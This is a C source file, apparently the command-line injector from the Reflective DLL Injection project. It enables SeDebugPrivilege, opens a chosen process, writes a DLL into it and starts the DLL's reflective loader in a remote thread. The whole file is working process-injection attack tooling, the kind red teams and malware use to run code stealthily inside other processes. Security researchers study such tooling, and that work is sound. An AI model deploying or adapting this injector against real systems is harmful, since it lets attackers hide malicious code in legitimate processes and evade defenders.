//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without modification, are permitted
// provided that the following conditions are met:
//
//     * Redistributions of source code must retain the above copyright notice, this list of
// conditions and the following disclaimer.
//
//     * Redistributions in binary form must reproduce the above copyright notice, this list of
// conditions and the following disclaimer in the documentation and/or other materials provided
// with the distribution.
//
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryR.h"

#ifndef __MINGW32__
#pragma comment(lib, "Advapi32.lib")
#endif

// Attempts to enable the SE_DEBUG_NAME privilege. This is necessary for opening
// handles to processes with higher privileges (e.g., system services).
static BOOL EnableDebugPrivilege()
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return FALSE;
	}

	TOKEN_PRIVILEGES priv = {0};
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
	{
		// This function may not succeed, but we don't check the return value
		// as we want to proceed even if it fails. The OpenProcess call will
		// ultimately determine if we have sufficient rights.
		AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
	}

	CloseHandle(hToken);
	// We return true even if AdjustTokenPrivileges fails, to allow injection
	// into processes with the same or lower privilege level.
	return TRUE;
}

// A simple command-line tool to inject a reflective DLL into a target process.
int main(int argc, char *argv[])
{
	HANDLE hFile = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwProcessId = 0;
  LPVOID lpParameter = NULL;
	char *cpDllFile = NULL;
	int exitCode = 1; // Default to error exit code

	// Set the default DLL name based on the architecture of this injector.
	// This ensures we inject a DLL of the same architecture.
#if defined(_M_X64)
	cpDllFile = "reflective_dll.x64.dll";
#elif defined(_M_ARM64)
	cpDllFile = "reflective_dll.arm64.dll";
#elif defined(_M_IX86)
	cpDllFile = "reflective_dll.Win32.dll";
#elif defined(_M_ARM)
	cpDllFile = "reflective_dll.arm.dll";
#else
#error "Unsupported architecture."
#endif

	printf("[*] Reflective DLL Injection Tool\n");

	// Parse command line: inject.exe [pid] [dll_path]
	if (argc == 1)
	{
		dwProcessId = GetCurrentProcessId();
		printf("[+] No PID specified. Defaulting to current process ID: %ld\n", dwProcessId);
	}
	else
	{
		dwProcessId = atoi(argv[1]);
	}

	if (argc >= 3)
	{
		cpDllFile = argv[2];
	}

  if (argc >= 4)
  {
    unsigned long long numericAddress = strtoull(argv[3], NULL, 0);
    lpParameter = (LPVOID)(uintptr_t)numericAddress;
  }

	printf("[+] Attempting to inject '%s' into process %ld...\n", cpDllFile, dwProcessId);

	// STAGE 1: Read the target DLL from disk into a local buffer.
	hFile = CreateFileA(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open the DLL file '%s'. Error: %ld\n", cpDllFile, GetLastError());
		goto cleanup;
	}

	DWORD dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
	{
		printf("[-] Failed to get the DLL file size. Error: %ld\n", GetLastError());
		goto cleanup;
	}

	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer)
	{
		printf("[-] Failed to allocate buffer for DLL. Error: %ld\n", GetLastError());
		goto cleanup;
	}

	DWORD dwBytesRead = 0;
	if (!ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) || dwBytesRead != dwLength)
	{
		printf("[-] Failed to read the DLL file into buffer. Error: %ld\n", GetLastError());
		goto cleanup;
	}

	// STAGE 2: Prepare for injection by enabling debug privileges and opening the target process.
	if (!EnableDebugPrivilege())
	{
		printf("[!] Warning: Failed to enable SeDebugPrivilege. Injection may fail for protected processes.\n");
	}

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
		printf("[-] Failed to open the target process. Error: %ld\n", GetLastError());
		goto cleanup;
	}
	printf("[+] Target process handle obtained: 0x%p\n", hProcess);

	// STAGE 3: Inject the DLL and execute its reflective loader.
	hThread = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, "tim", lpParameter);
	if (!hThread)
	{
		printf("[-] Failed to inject the DLL. LoadRemoteLibraryR failed with error: %ld\n", GetLastError());
		goto cleanup;
	}
	printf("[+] Injection successful. Remote thread created with handle: 0x%p\n", hThread);
	printf("[+] Waiting for remote thread to terminate...\n");

	WaitForSingleObject(hThread, INFINITE);
	printf("[+] Remote thread has terminated.\n");

	// STAGE 4: Get and report the exit code of the remote loader thread for diagnostics.
	DWORD dwRemoteExitCode = 0;
	if (GetExitCodeThread(hThread, &dwRemoteExitCode))
	{
		printf("[+] Remote thread exit code: 0x%08lX\n", dwRemoteExitCode);
		// A high-bit error code indicates a failure inside the reflective loader.
		if ((dwRemoteExitCode & 0xF0000000) == 0xE0000000)
		{
			printf("[-] ReflectiveLoader failed with internal error code: 0x%lX\n", dwRemoteExitCode);
		}
	}
	else
	{
		printf("[-] Failed to get remote thread exit code. Error: %ld\n", GetLastError());
	}

	exitCode = 0; // Set success exit code for the injector itself.

cleanup:
	// STAGE 5: Clean up all opened handles and allocated memory.
	if (hThread)
		CloseHandle(hThread);
	if (hProcess)
		CloseHandle(hProcess);
	if (lpBuffer)
		HeapFree(GetProcessHeap(), 0, lpBuffer);
	if (hFile)
		CloseHandle(hFile);

	printf("[*] Finished.\n");
	return exitCode;
}
